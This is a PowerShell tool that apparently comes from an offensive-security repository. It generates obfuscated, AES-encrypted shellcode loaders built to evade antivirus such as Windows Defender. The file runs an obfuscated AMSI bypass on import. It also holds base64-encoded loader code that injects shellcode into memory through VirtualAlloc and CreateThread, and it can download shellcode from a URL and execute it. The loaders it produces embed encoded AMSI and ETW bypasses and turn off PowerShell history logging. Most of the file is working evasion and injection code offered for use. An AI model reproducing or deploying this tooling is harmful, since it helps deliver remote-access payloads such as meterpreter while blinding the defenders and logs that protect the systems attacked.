# ===============================================================================================================================
# Invoke-PoSH-ShellCodeLoader1 is a simple shellcode loader generator that aims to bypass AV solutions such as Windows Defender.
# It works with shellcodes generated with the format 'ps1' such as 'msfvenom windows/x64/meterpreter/reverse_https -f ps1 ...'
# Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
# ===============================================================================================================================
# Features:
# - Shellcode injection into the memory of the current process
# - AES encryption and GZip compression (based on 'Xencrypt')
# - AMSI bypass
# - Blocking Event Tracing for Windows (ETW)
# - Disabling PowerShell history logging
# ===============================================================================================================================
# Usage:
# > Import-Module ./Invoke-PoSH-ShellCodeLoader1.ps1
# > Invoke-PoSH-ShellCodeLoader1 -FileUrl https://URL/shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
# > Invoke-PoSH-ShellCodeLoader1 -FilePath C:\path\shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
# ===============================================================================================================================

Write-Output "
  ___     ___ _  _     ___ _        _ _  ___         _     _                _         
 | _ \___/ __| || |___/ __| |_  ___| | |/ __|___  __| |___| |   ___  __  __| |___ ___ 
 |  _/ _ \__ \ __ |___\__ \ ' \/ -_) | | (__/ _ \/ _  / -_| |__/ _ \/ _|/ _  / -_)  _|
 |_| \___/___/_||_|   |___/_||_\___|_|_|\___\___/\__,_\___|____\___/\__,\__,_\___|_|  
                                                                                     v1.0 
Usage:
> Import-Module ./Invoke-PoSH-ShellCodeLoader1.ps1
> Invoke-PoSH-ShellCodeLoader1 -FileUrl https://URL/shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
> Invoke-PoSH-ShellCodeLoader1 -FilePath C:\path\shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1

Features:
[*] Shellcode injection into the memory of the current process
[*] AES encryption and GZip compression
[*] AMSI bypass
[*] Blocking Event Tracing for Windows (ETW)
[*] Disabling PowerShell history logging
"

# ''A'''M''S''I''-''B''Y''P''A''S''S''
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" -f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($null),0x41414141);

function Invoke-PoSH-ShellCodeLoader1 {
	
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $Filepath,
		 
		[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $Fileurl,

        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $Outfile = $(Throw("-OutFile is required"))
		)

    Process {

        $TempShellCodeLoaderFile = "C:\Windows\Temp\templateloader.ps1"
        $ShellcodeLoaderPart1 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("ZnVuY3Rpb24gSmVmZiB7CiAgICBQYXJhbSAoJE5hZEVnZSwgJGZsbykKICAgICRqdUxpYSA9IChbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfCA/IHsgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCdcXCcpWy0xXS5FcXVhbHMoJ1N5c3RlbS5kbGwnKSB9KS5HZXRUeXBlKCdNaWNyb3NvZnQuV2luMzIuVW5zYWZlTmF0aXZlTWV0aG9kcycpCiAgICAkdG1wID0gQCgpCiAgICAkanVMaWEuR2V0TWV0aG9kcygpIHwgJSB7SWYoJF8uTmFtZSAtZXEgIkdldFByb2NBZGRyZXNzIikgeyR0bXAgKz0gJF99fQogICAgcmV0dXJuICR0bXBbMF0uSW52b2tlKCRudWxsLCBAKCgkanVMaWEuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCROYWRFZ2UpKSwgJGZsbykpCn0KZnVuY3Rpb24gcm9iZXJ0IHsKICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeT0kVHJ1ZSldW1R5cGVbXV0gJE5pQ28sCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0xKV1bVHlwZV0gJHJldFR5cGUgPSBbVm9pZF0KICAgICkKICAgICR0eXBlID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKICAgICR0eXBlLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJE5pQ28pLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICAgJHR5cGUuRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkcmV0VHlwZSwgJE5pQ28pLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICAgcmV0dXJuICR0eXBlLkNyZWF0ZVR5cGUoKQp9CiRyb2dlciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChKZWZmIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAocm9iZXJ0IEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkpKS5JbnZva2UoW0ludFB0cl06Olplcm8sIDB4MTAwMCwgMHgzMDAwLCAweDQwKQ==")))
        $ShellcodeLoaderPart2 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkYnVmLCAwLCAkcm9nZXIsICRidWYubGVuZ3RoKQokaFRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChKZWZmIGtlcm5lbDMyLmRsbCBDcmVhdGVUaHJlYWQpLCAocm9iZXJ0IEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKSkpLkludm9rZShbSW50UHRyXTo6WmVybywgMCwgJHJvZ2VyLCBbSW50UHRyXTo6WmVybywgMCwgW0ludFB0cl06Olplcm8pCltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChKZWZmIGtlcm5lbDMyLmRsbCBXYWl0Rm9yU2luZ2xlT2JqZWN0KSwgKHJvYmVydCBAKFtJbnRQdHJdLCBbSW50MzJdKSAoW0ludF0pKSkuSW52b2tlKCRoVGhyZWFkLCAweEZGRkZGRkZGKQ==")))

        if ($Filepath) {	
			Write-Output "[*] Loading the local file: '$($Filepath)"
			# $shellCodestring == [IO.File]::ReadAllText($Filepath)
			$ShellCodestring = Get-Content $Filepath
			Write-Output "[*] Creating the Shellcode loader script"
			[System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1 + "`r`n");
			[System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodestring + "`r`n");
			[System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
		}
		elseif ($Fileurl){
			Write-Output "[*] Downloading the remote file: '$($Fileurl)'"
			$ShellCodestring = echo(New-Object Net.WebClient).DownloadString($Fileurl);
			Write-Output "[*] Creating the ShellCode loader script"
			[System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1 + "`r`n");
			[System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodestring + "`r`n");
			[System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
		}
		
        $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
        $paddingmode = $paddingmodes | Get-Random
        $ciphermodes = 'ECB','CBC'
        $ciphermode = $ciphermodes | Get-Random

        $keysizes = 128,192,256
        $keysize = $keysizes | Get-Random

        $compressiontypes = 'Gzip','Deflate'
        $compressiontype = $compressiontypes | Get-Random

        Write-Output "[*] File compression (GZip)"
		$TempShellCodeLoaderFileRead = [System.IO.File]::ReadAllBytes($TempShellCodeLoaderFile)
		Del "C:\Windows\Temp\templateloader.ps1"
        [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
        if ($compressiontype -eq "Gzip") {
            $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
        } 
		elseif ( $compressiontype -eq "Deflate") {
            $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
        }
      	$compressionStream.Write( $TempShellCodeLoaderFileRead, 0, $TempShellCodeLoaderFileRead.Length )
        $compressionStream.Close()
        $output.Close()
        $compressedBytes = $output.ToArray()

        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        if ($ciphermode -eq 'CBC') {
            $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        } 
		elseif ($ciphermode -eq 'ECB') {
            $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
        }
        if ($paddingmode -eq 'PKCS7') {
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        } 
		elseif ($paddingmode -eq 'ISO10126') {
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
        } 
		elseif ($paddingmode -eq 'ANSIX923') {
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
        } 
		elseif ($paddingmode -eq 'Zeros') {
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        }

        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        $aesManaged.GenerateKey()
        $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

        Write-Output "[*] File encryption (AES)"
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData
        $aesManaged.Dispose()
        $b64encrypted = [System.Convert]::ToBase64String($fullData)
        
		$ShellCodeLoaderFile = ''
        
        Write-Output "[*] Adding 'A'M'S'I' bypass"
        $Code_fixed_order1 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
        $ShellCodeLoaderFile += $Code_fixed_order1 -join ''
        $Code_fixed_order2 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
        $ShellCodeLoaderFile += $Code_fixed_order2 -join ''
	    $Code_fixed_order3 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
        $ShellCodeLoaderFile += $Code_fixed_order3 -join ''
        $Code_fixed_order4 += 'iex(${11})' + "`r`n"
        $ShellCodeLoaderFile += $Code_fixed_order4 -join ''
        
        Write-Output "[*] Adding 'E'T'W' bypass" 
	    $Code_fixed_order5 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
        $ShellCodeLoaderFile += $Code_fixed_order5 -join ''
        $Code_fixed_order6 += '${13} = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzU0VtYkxZLkdldF"' + "`r`n"
        $ShellCodeLoaderFile += $Code_fixed_order6 -join ''
        $Code_fixed_order7 += '${14} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${13}+${12})))' + "`r`n"
        $ShellCodeLoaderFile += $Code_fixed_order7 -join ''
        $Code_fixed_order8 += 'iex(${14})' + "`r`n"
        $ShellCodeLoaderFile += $Code_fixed_order8 -join ''
        
        Write-Output "[*] Disabling PoSh history logging"
        $Code_fixed_order9 += '${15} = "U2V0LVBTUmVBZExJbmVPcFRpb24g"' + "`r`n"
        $ShellCodeLoaderFile += $Code_fixed_order9 -join ''
        $Code_fixed_order10 += '${16} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${15}+"LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn")))' + "`r`n"
        $ShellCodeLoaderFile += $Code_fixed_order10 -join ''
        $Code_fixed_order11 += 'iex(${16})' + "`r`n"
        $ShellCodeLoaderFile += $Code_fixed_order11 -join ''
        
        $Code_alternatives  = @()
        $Code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
        $Code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
        $Code_alternatives += '${4} = New-Object "System.Security.Cryptography.AesManaged"' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''
        
        $Code_alternatives  = @()
        $Code_alternatives += '${4}.Mode = [System.Security.Cryptography.CipherMode]::'+$ciphermode + "`r`n"
        $Code_alternatives += '${4}.Padding = [System.Security.Cryptography.PaddingMode]::'+$paddingmode + "`r`n"
        $Code_alternatives += '${4}.BlockSize = 128' + "`r`n"
        $Code_alternatives += '${4}.KeySize = '+$keysize + "`n" + '${4}.Key = ${3}' + "`r`n"
        $Code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''

        $Code_alternatives  = @()
        $Code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
        $Code_alternatives += '${7} = New-Object System.IO.MemoryStream' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''

        if ($compressiontype -eq "Gzip") {
            $ShellCodeLoaderFile += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
        } 
		elseif ( $compressiontype -eq "Deflate") {
            $ShellCodeLoaderFile += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
        }
        $ShellCodeLoaderFile += '${5}.CopyTo(${7})' + "`r`n"

        $Code_alternatives  = @()
        $Code_alternatives += '${5}.Close()' + "`r`n"
        $Code_alternatives += '${4}.Dispose()' + "`r`n"
        $Code_alternatives += '${6}.Close()' + "`r`n"
        $Code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${7}.ToArray())' + "`r`n"
        $Code_alternatives_shuffled = $Code_alternatives | Sort-Object {Get-Random}
        $ShellCodeLoaderFile += $Code_alternatives_shuffled -join ''

        $ShellCodeLoaderFile += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
        
        $Code = $ShellCodeLoaderFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
        $TempShellCodeLoaderFileRead = [System.Text.Encoding]::UTF8.GetBytes($Code)
        
        Write-Output "[*] The obfuscated & encrypted shellcode loader script has been saved: '$($Outfile)' ..."
        [System.IO.File]::WriteAllText($Outfile,$Code)
        Write-Output "[+] Done!"
	}
}

function Create-Random-Var() {
        $set = "abcdefghijkmnopqrstuvwxyzABCDEFGHIJKLMNOP0123456789"
        (1..(4 + (Get-Random -Maximum 8)) | %{ $set[(Get-Random -Minimum 1 -Maximum $set.Length)] } ) -join ''
}
